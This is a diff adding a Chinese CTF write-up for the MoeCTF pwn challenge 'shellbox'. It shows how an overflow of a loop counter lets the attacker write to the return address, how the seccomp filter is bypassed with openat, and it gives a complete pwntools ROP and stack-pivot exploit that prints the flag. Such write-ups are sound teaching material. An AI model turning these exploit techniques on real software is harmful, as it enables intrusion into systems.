@@ -3552,3 +3552,284 @@ size_t __fastcall my_read(_BYTE *buf, size_t nbytes)
 > 倘若 `printf` 具有更多参数，它们会被依次放入寄存器；若寄存器的个数仍无法满足参数的存放，多余的参数则会被压入栈中。但 `printf` 本身并不知道它被调用时传递了多少个参数：`printf` 只会解析第一个参数中 `%` 占位符的个数来决定需要多少个参数。当我们向 `printf` 的格式化字符串中传入过多 `%` 占位符后，`printf` 就会按照寄存器到栈的顺序依次查找。那么问题来了，当我们提供了多余参数的占位符数量后，`printf` 会从哪里寻找多于参数的值呢？答案是，它会继续从栈上读取！这样，`printf` 就会把自己的栈帧和相邻的栈帧当成指针统统打印出来，而这些指针中，或许就包括栈地址、`libc` 地址 和/或 其他敏感数据！
 >
 > 不过我们可能会心生疑惑：`main` 函数会返回到哪呢？事实上，程序启动的时候，并非是直接跳转到 `main` 函数；它通常会由 `libc` 中的一个函数（`__libc_start_main`）负责准备好环境，然后再调用 `main` 函数；所以，`main` 函数执行完毕后，会返回 `__libc_start_main` 中。如果我们用 `printf` 继续向下打印地址，那就非常有可能够到 `main` 函数栈帧中的返回地址！
+
+## shellbox
+
+> [!NOTE]
+>
+> 星澜音斩获 The First Blood（一血），但由于斩获时精神状态不佳，因此在提交 `flag` 后清除了与 Gemini 的聊天记录，并销毁了 `exploit.py`。在编写 writeup 时，星澜音已无法还原一杀做法。
+>
+> 下面给出的为二杀做法，其基本思路应当与一杀相同，但在部分细节处理上可能有所偏差。星澜音在其中使用了 Pwntools 的自动化 ROP 构造等高级特性，当然手动构造亦是可行的。
+>
+> **FLAG:** `moectf{IOvELY_X1-X1a0-Di4Nec146074f}`，后面可能是随机的。
+
+查看 `main` 函数：
+
+```c
+int __fastcall main(int argc, const char **argv, const char **envp)
+{
+    _BYTE v4[4]; // [rsp+8h] [rbp-8h] BYREF
+    int n9; // [rsp+Ch] [rbp-4h]
+
+    init(argc, argv, envp);
+    sandbox();
+    n9 = 0;
+    puts("You have a box, fill it.");
+    read(0LL, &buf, 256LL);
+    puts("Now, leave your name..");
+    while ( n9 != 1 )
+    {
+        if ( n9 > 9 )
+        {
+            puts("Why is it so long?");
+            break;
+        }
+        putchar(62LL);
+        read(0LL, &v4[8 * n9++], 8LL);
+    }
+    puts("Bye!");
+    return 0;
+}
+```
+
+其中 `init` 函数仍用来设置全局缓冲区。`read(0LL, &buf, 256LL);` 看起来极像一个诱人的缓冲区溢出漏洞，但 IDA Pro 跟踪发现 `buf` 真的有这么大… 😤 此路不通。跳过 `sandbox()`，我们看到了
+
+```c
+...
+
+_BYTE v4[4]; // [rsp+8h] [rbp-8h] BYREF
+int n9; // [rsp+Ch] [rbp-4h]
+
+...
+
+n9 = 0
+
+...
+
+while ( n9 != 1 )
+{
+    if ( n9 > 9 )
+    {
+        puts("Why is it so long?");
+        break;
+    }
+    putchar(62LL);
+    read(0LL, &v4[8 * n9++], 8LL);
+}
+```
+
+这是一个精妙的逻辑！程序仅在 `n9 != 1` 时允许写入，看起来是只能写入一次的，但这恰好有办法绕过：第一次循环时，`n9` 的值为 `0`；随后程序执行 `read(0LL, &v4[0], 8)` 向 4 字节的 `v4` 写入 8 字节的数据。我们在 IDA Pro 的 `Stack of main` 中可见：
+
+```plain
+-0000000000000008     _BYTE var_8;
+-0000000000000007     // padding byte
+-0000000000000006     // padding byte
+-0000000000000005     // padding byte
+-0000000000000004     _DWORD var_4;
++0000000000000000     _QWORD __saved_registers;
++0000000000000008     _UNKNOWN *__return_address;
++0000000000000010
++0000000000000010 // end of stack variables
+```
+
+也就是说，我们总能使用这 8 字节的数据，在写入 4 字节的 `v4` 后溢出覆盖紧跟其后的 `n9`，这样，我们便能保持这样的循环；且考虑到 `read()` 实际写入的地址是 `&v4[8 * n9++]`，事实上，我们通过控制 `n9` 的值，甚至能达成任意地址写入。这是极好的。从上面的栈帧分析中，我们明确了返回地址位于 `&v4[16]`。为了让程序能够写入到返回地址，我们需要确认 `n9` 的值。事实上，为了使
+
+$$
+8 \times n_9 = 16
+$$
+
+只需在等式两侧同时乘以 $\dfrac{1}{8}$：
+
+$$
+8 \times n_9 \times \frac{1}{8} = 16 \times \frac{1}{8}
+$$
+
+化简即可：
+
+$$
+n_9 = 2
+$$
+
+左边使用了恒等式 $a \times \dfrac{1}{a} = 1$，这里 $a \neq 0$。这便确定了 `n9` 的值。读者朋友亦可使用其他方法求解，这里留做习题答案略。🤣
+
+我们确定第一次 payload 的值：
+
+```plain
+b'LYCN' + p32(1)
+```
+
+其中 `LYCN` 是全世界第二可爱的 `LyCecilion` 的缩写，仅用于 padding；`p32(1)` 将 `n9` 写为 `1`，使得第二轮循环中绕过 `n9` 的 `if` 判定并自增为 `2`。下一轮循环中，`read()` 块将变为 `read(0, &v4[16], 8)`，我们获得了向 `return addr` 写入任意 8 字节数据的能力！😋至于那个 Canary，其实已经作用不大了：我们都能指哪打哪了，直接把它绕过就完事了。
+
+现在，我们回到 `sandbox()` 函数。
+
+```c
+__int64 sandbox()
+{
+    int v0; // r8d
+    int v1; // r9d
+    int v2; // r8d
+    int v3; // r9d
+    __int64 v5; // [rsp+8h] [rbp-8h]
+
+    v5 = seccomp_init(2147418112LL);
+    seccomp_rule_add(v5, 0, 59, 0, v0, v1);
+    seccomp_rule_add(v5, 0, 2, 0, v2, v3);
+    return seccomp_load(v5);
+}
+```
+
+这段代码实现了一个 `seccomp` 沙盒，用于限制进程可以执行的 syscall。我们先前已经探讨过 syscall 的相关事宜，这里不再赘述。我们来定睛细看 `seccomp`：
+
+```c
+v5 = seccomp_init(2147418112LL);
+```
+
+这行代码初始化了一个 `seccomp` 过滤器，并设置了一个默认动作（Default Action），决定了沙箱是「黑名单」还是「白名单」。这里的 `2147418112LL` 转换为十六进制为 `0x7FFF0000`，在 `seccomp` 库的头文件中，它被定义为 `SCMP_ACT_ALLOW`，也就是说，它初始化了一个沙箱，默认规则为允许所有 syscall。
+
+```c
+seccomp_rule_add(v5, 0, 59, 0, v0, v1);
+seccomp_rule_add(v5, 0, 2, 0, v2, v3);
+```
+
+紧接着，这两行代码使用 `seccomp_rule_add` 向沙箱中添加了具体的规则，其原型为
+
+```c
+int seccomp_rule_add(scmp_filter_ctx ctx, uint32_t action, int syscall, unsigned int arg_cnt, ...);
+```
+
+第 3 个参数是要匹配的系统调用号，而第 2 个参数定义了若规则匹配，要执行什么动作。在 `seccomp` 库中，`0` 对应 `SCMP_ACT_KILL`，也就是杀死进程。而 `59` 和 `2` 两个系统调用号，恰好对应 `execve` 和 `open`。`seccomp_load` 加载沙箱环境，也就是说，现在开始，程序 **一旦调用** `execve` 和 `open`，就会立刻原地升天。~~啊呀这个出题人怎么这么坏啊~~
+
+但是…还有 `openat`（系统调用号 257）！我们无法 `execve`，所以 `getshell` 是困难的，但是我们选择直接把 `flag` 打出来不就好了吗？拼接下面的 ROP 逻辑：
+
+```plain
+openat(AT_FDCWD, "/flag", O_RDONLY)
+read(fd, buf, length)
+write(1, buf, length)
+```
+
+这是容易的。我们直接对着 `return addr` 一股脑写入——
+
+但别急。我们在先前也手动构造过 syscall ROP 链：对于一次 syscall 来讲，参数按需按顺序摆放好，然后用一个 gadget 写入寄存器，再调用 syscall…（倒吸一口凉气）倒不是说手动构造累人不累人，找 gadget 难受不难受，单单从 ROP 链的长度出发，在我们这次的 syscall ROP 链中，有 3 个 syscall，每个 syscall 都需要 3 个参数。若我们不做任何优化，则 ROP 链的长度也至少为
+
+$$
+3 \times (3 + 1 + 1) \times 8 = 120 \text{ (bytes)}
+$$
+
+而我们的 `n9` 仅能为 `2..9`，即我们最多循环 8 次，最多能向 return addr 写入
+
+$$
+8 \times 8 = 64 \text{ (bytes)}
+$$
+
+这……哪怕我们能对 ROP 链做多么绝妙的优化，似乎也不可能把整个链的长度砍半吧。~~况且零音也不像是那种 minimalism 的人（（~~ 看来必须要想一个高招——
+
+**栈迁移！** 是的，还是我们那个 `ezpivot` 的思路（不过为啥不是 `hardpivot`？因为零音还没做这个题，懒得做了），但是写入到哪？🤔还记得我们前面发现的 `buf` 吗，它位于 .bss segment 上！我就知道出题人不会无缘无故给这么大一块空间😋 ~~啊呀这个出题人怎么这么好啊~~
+
+对了，先用 `checksec` 看一下情况：
+
+```plain
+[*] '/mnt/s/MoeCTF/Pwn/shellbox/pwn'
+    Arch:       amd64-64-little
+    RELRO:      Partial RELRO
+    Stack:      Canary found
+    NX:         NX enabled
+    PIE:        No PIE (0x400000)
+    SHSTK:      Enabled
+    IBT:        Enabled
+    Stripped:   No
+```
+
+哈哈哈，PIE 没开 😋 我们只需要直接指定 `buf` 的地址就好了。我们把 ROP 链写到 `buf` 里，然后在 64 个字节内安置好栈迁移的逻辑即可！这个「引爆器」只需要一个 `pop rsp ; ret` 和一个 `buf` 的地址，加起来不过 16 字节，是极好的。
+
+这里我们偷懒用一次 ROP 自动构造好了。~~其实单纯是星澜音二杀的时候想试试 Pwntools 的高级特性罢了~~ 自己构造也是可以的，但是星澜音实懒😭
+
+```python
+from pwn import *
+
+# --- 配置 ---
+elf = ELF('./pwn')
+# p = process(elf.path)
+# gdb.attach(p)
+p = remote('127.0.0.1', 9038)
+
+context.arch = 'amd64'
+context.log_level = 'debug'
+
+# --- Gadgets 和地址 ---
+rop = ROP(elf)
+try:
+    # fail-fast，确保这些 Gadgets 都存在
+    POP_RDI_RET = rop.find_gadget(['pop rdi', 'ret']).address
+    POP_RSI_RET = rop.find_gadget(['pop rsi', 'ret']).address
+    POP_RDX_RET = rop.find_gadget(['pop rdx', 'ret']).address
+    POP_RAX_RET = rop.find_gadget(['pop rax', 'ret']).address
+    SYSCALL_ADDR = next(elf.search(asm('syscall', arch='amd64')))
+    POP_RSP_RET = rop.find_gadget(['pop rsp', 'ret']).address
+    info("Gadgets found automatically.")
+    info(f"Syscall instruction found at: {hex(SYSCALL_ADDR)}")
+    info(f"pop rsp; ret gadget found at: {hex(POP_RSP_RET)}")
+except Exception as e:
+    error(f"Could not find gadgets automatically: {e}. Please find them manually.")
+    exit(1)
+
+ADDR_BUF = 0x4ceb60
+FLAG_STRING_ADDR = ADDR_BUF + 0xf0 # 将 "/flag" 字符串放在 buf 的末尾
+
+# --- 步骤 1: 在 buf 中构建主 ROP 链 ---
+main_rop = ROP(elf)
+# openat(AT_FDCWD, &"/flag", O_RDONLY)
+main_rop.openat(-100, FLAG_STRING_ADDR, 0)
+# read(fd=3, buf, 0x40)
+main_rop.read(3, ADDR_BUF, 0x40)
+# write(1, buf, 0x40)
+main_rop.write(1, ADDR_BUF, 0x40)
+
+# 构建 buf 的 payload
+buf_payload = b'A' * 8 # 填充
+buf_payload += main_rop.chain()
+buf_payload = buf_payload.ljust(0xf0, b'\x00') # 填充到字符串位置
+buf_payload += b'/flag\x00'
+
+# 发送 buf payload
+p.sendafter(b"fill it.", buf_payload)
+
+# --- 步骤 2: 在栈上写入栈迁移 payload ---
+stack_pivot_payload = p64(POP_RSP_RET) + p64(ADDR_BUF + 8) # +8 跳过填充
+
+# 第一次循环 (v5=0)，设置 v5=1，使下一轮 v5=2
+p.sendafter(b'>', b'LYCN' + p32(1))
+
+# 第二次循环 (v5=2)，写入我们的栈迁移 payload
+p.sendafter(b'>', stack_pivot_payload)
+
+# 发送垃圾数据，让 v5 增长直到循环退出
+for i in range(7): # v5 会从 3 增长到 9
+    p.sendafter(b'>', b'DryIcecc') # 远端环境现在知道零音喜欢的是谁了吧
+
+# 此时循环会 break，main 函数返回，触发 ROP
+info("Stack pivot payload sent. Triggering ROP chain...")
+
+# --- 接收 Flag ---
+try:
+    flag = p.recvuntil(b'}', timeout=2)
+    print("\n[+] Flag received:")
+    print(flag.decode())
+except EOFError:
+    print("\n[-] Connection closed. Exploit might have failed.")
+    print("[-] This could be due to Shadow Stack (SHSTK) mitigation.")
+    print("[-] Received data so far:", p.recvall(timeout=1).decode())
+
+p.close()
+```
+
+运行，输出
+
+```plain
+[+] Flag received:
+Why is it so long?
+Bye!
+moectf{IOvELY_X1-X1a0-Di4Nec146074f}
+[*] Closed connection to 127.0.0.1 port 9038
+```
+
+「西…小电」？哦，那确实可爱😋感觉能和 XDSEC 娘坐一桌，但是百团大战的时候我没拿到的 XDSEC 娘贴纸在哪补？不是说第一次面试的时候补吗，我真生气了😡😡
